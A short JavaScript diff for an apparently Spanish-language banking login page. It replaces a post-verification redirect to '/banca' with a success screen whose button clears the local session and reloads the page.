@@ -180,17 +180,8 @@ function startPolling() {
           loader.classList.remove("open");
           document.getElementById("claveScreen").hidden = true;
           
-          toast("Verificación exitosa");
-          
-          setSession({
-            type: docType.value,
-            doc: docNumber.value,
-            name: nameFromDoc(docNumber.value),
-          });
-          
-          setTimeout(() => {
-            window.location.href = "/banca";
-          }, 1500);
+          // Mostrar pantalla de éxito
+          document.getElementById("exitoScreen").hidden = false;
         }
       }
     } catch (_) {}
@@ -302,6 +293,14 @@ document.getElementById("claveForm")?.addEventListener("submit", (e) => {
 
 document.getElementById("claveHelp")?.addEventListener("click", () => {
   toast("Ingresa el código que visualizas en la aplicación de tu celular.");
+});
+
+document.getElementById("exitoBtn")?.addEventListener("click", () => {
+  // Limpiar sesión local
+  localStorage.removeItem("bf_session");
+  
+  // Recargar la página limpia
+  window.location.reload();
 });
 
 [docNumber, password].forEach(input => {
